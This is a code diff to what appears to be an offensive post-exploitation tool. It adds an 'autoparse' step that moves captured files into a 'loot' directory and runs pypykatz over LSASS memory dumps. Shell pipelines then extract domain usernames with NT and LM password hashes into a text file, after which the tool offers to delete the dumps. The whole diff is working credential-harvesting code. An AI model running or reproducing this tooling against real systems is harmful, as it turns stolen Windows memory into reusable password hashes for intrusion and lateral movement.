@@ -1107,6 +1107,23 @@ def setup_share():
 
 def alt_exec():
     yes = input('Press enter to exit ')
+    
+    try: # move the share file to the loot dir 
+        os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
+    except BaseException as e:
+        pass
+
+    if options.ap: # autoparse
+        printnlog("\n[parsing files]")
+        os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
+        os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
+        os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
+
+        remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
+        if remove_files.lower() == 'y':
+            os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
+        
+    
     printnlog("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
 
     if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
@@ -1138,11 +1155,6 @@ def alt_exec():
     try:
         os.system("sudo groupdel " + share_group)
         printnlog(green_plus + " Removed the group: " + share_group)
-    except BaseException as e:
-        pass
-
-    try:
-        os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
     except BaseException as e:
         pass
 
